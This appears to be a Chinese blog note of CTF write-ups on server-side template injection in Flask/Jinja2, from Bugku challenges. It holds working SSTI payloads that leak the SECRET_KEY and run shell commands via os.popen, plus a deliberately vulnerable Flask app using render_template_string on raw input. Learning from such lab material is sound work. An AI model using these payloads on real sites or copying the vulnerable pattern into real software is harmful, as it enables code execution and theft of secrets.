---
author: "Yiming Shen"
date: 2021-07-22
lastmod: 2021-07-22
title: "SSTI类型题目积累及资料"
tags: [
    "CTF",
    "Web",
    "SSTI",
    "Note",
]
categories: [
    "Notes",
     "CTF",
]
math: true
draft: false
typora-root-url: ..\..\..\static\
---

## SSTI类型介绍

SSTI即服务端模板注入攻击，服务端接收用户输入，将其作为Web应用模板的一部分，渲染编译后执行了恶意内容，导致敏感信息泄露、代码执行等。

工具：*tplmap*、*hackbar*

按这张图可以测试出具体是什么模板引擎：

![img](https://upload.nsg.cn/uploads/images/202009/26/9/8sFfzWRJrj.png!large)

### 1. Simple_SSTI_1

[Simple_SSTI_1](https://ctf.bugku.com/challenges/detail/id/196.html?page=3)

进入环境后，使用开发者工具查看网站源代码，发现一句提示：

> You know, in the flask, We often set a secret_key variable.-->

根据提示可以得出

1. 采用了flask框架

2. flag很有可能存储在secret_key中

尝试get注入：`?flag={{config.SECRET_KEY}}`

成功~

### 2.Simple_SSTI_2

[Simple_SSTI_2](ctf.bugku.com/challenges/detail/id/203.html)

题目提示了进行模板注入，套用魔术方法。

> /?flag={{config.__class__.__init__.__globals__['os'].popen('ls >   >../').read()}}
>
>   

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210310204413618.png)

发现存在以下文件夹，利用cd命令进入查看后，发现第一个app文件夹内有flag文件

> cat ../app/flag

查看flag文件，得解。

#### 本题思考

利用Python-flask框架搭建简易网站复现SSTI漏洞如下：

```Python
from flask import Flask
from flask import render_template
from flask import render_template_string
from flask import request
app=Flask(__name__)
@app.route("/login")
def login():
    username=request.args.get("flag")
    html='''
    <h1> Python本地网站-Login %s</h1>
    '''%(username)
    return render_template_string(html)

if __name__=="__main__":
    app.run(debug=True)
```

浏览器访问127.0.0.1:5050/login 

搭建成功~

传入表达式：?flag={{2**64}}

真不错，用Python高精度计算

``` shell

?name={{\%27\%27.__class__.__mro__[1].__subclasses__()[213].__init__.__globals__[\%27__builtins__\%27][\%27__import__\%27](\%27os\%27).popen("dir").read()}}

```

使用Windows平台下的命令get注入即可访问本地文件。

